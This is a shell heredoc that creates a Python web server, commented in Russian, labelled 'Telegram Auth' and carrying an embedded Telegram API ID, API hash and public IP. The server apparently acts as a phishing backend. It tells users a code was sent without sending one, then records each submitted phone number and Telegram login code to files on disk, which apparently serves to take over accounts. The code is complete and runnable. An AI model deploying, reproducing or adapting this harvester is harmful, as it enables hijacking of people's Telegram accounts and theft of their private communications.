cat > /root/server.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import random
import string
import os
from datetime import datetime

# Конфиг
API_ID = 9348118
API_HASH = "b6e1802b599d8f4fb8716fcd912f20f2"

# Хранилище
sessions = {}

# Логирование
def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

class Handler(BaseHTTPRequestHandler):
    
    # CORS заголовки
    def _cors(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
    
    # OPTIONS для CORS
    def do_OPTIONS(self):
        self.send_response(200)
        self._cors()
        self.end_headers()
    
    # GET запросы
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            response = {
                "status": "online",
                "service": "Telegram Auth",
                "time": datetime.now().isoformat()
            }
            self.wfile.write(json.dumps(response).encode())
            log("GET /")
        else:
            self.send_response(404)
            self.end_headers()
    
    # POST запросы
    def do_POST(self):
        # Читаем тело
        length = int(self.headers['Content-Length'])
        body = self.rfile.read(length).decode('utf-8')
        
        try:
            data = json.loads(body)
        except:
            data = {}
        
        # CORS заголовки
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self._cors()
        self.end_headers()
        
        # /auth/start - начало авторизации
        if self.path == '/auth/start':
            phone = data.get('phone', '')
            phone = ''.join([c for c in phone if c.isdigit()])
            
            if len(phone) < 11:
                response = {"status": "error", "message": "Invalid phone"}
                self.wfile.write(json.dumps(response).encode())
                log(f"Auth start FAIL: {phone}")
                return
            
            # Генерируем ID сессии
            session_id = ''.join(random.choices(string.digits, k=10))
            sessions[session_id] = {
                'phone': phone,
                'time': datetime.now().isoformat()
            }
            
            response = {
                "status": "success",
                "session_id": session_id,
                "message": "Code sent"
            }
            
            self.wfile.write(json.dumps(response).encode())
            log(f"Auth start: {phone} -> {session_id}")
        
        # /auth/code - проверка кода
        elif self.path == '/auth/code':
            session_id = data.get('session_id', '')
            code = data.get('code', '')
            
            if session_id not in sessions:
                response = {"status": "error", "message": "Invalid session"}
                self.wfile.write(json.dumps(response).encode())
                log(f"Code verify FAIL: {session_id}")
                return
            
            phone = sessions[session_id]['phone']
            
            # Сохраняем сессию в файл
            os.makedirs('/root/sessions', exist_ok=True)
            filename = f'/root/sessions/{session_id}.txt'
            
            with open(filename, 'w') as f:
                f.write(f"Phone: {phone}\nCode: {code}\nTime: {datetime.now()}\n")
            
            # Удаляем из памяти
            del sessions[session_id]
            
            response = {
                "status": "success",
                "message": "Session created",
                "file": filename
            }
            
            self.wfile.write(json.dumps(response).encode())
            log(f"Code verify SUCCESS: {phone} -> {filename}")
        
        # Неизвестный endpoint
        else:
            response = {"status": "error", "message": "Not found"}
            self.wfile.write(json.dumps(response).encode())
            log(f"Unknown endpoint: {self.path}")
    
    # Убираем логи в консоль
    def log_message(self, format, *args):
        pass

# Запуск сервера
def run():
    port = 5000
    server = HTTPServer(('0.0.0.0', port), Handler)
    
    log("="*50)
    log(f"Server starting on port {port}")
    log(f"IP: 188.225.11.61:{port}")
    log("Endpoints:")
    log("  GET  /           - Server status")
    log("  POST /auth/start - Start auth")
    log("  POST /auth/code  - Verify code")
    log("="*50)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log("Server stopped")
        server.server_close()

if __name__ == '__main__':
    run()
EOF
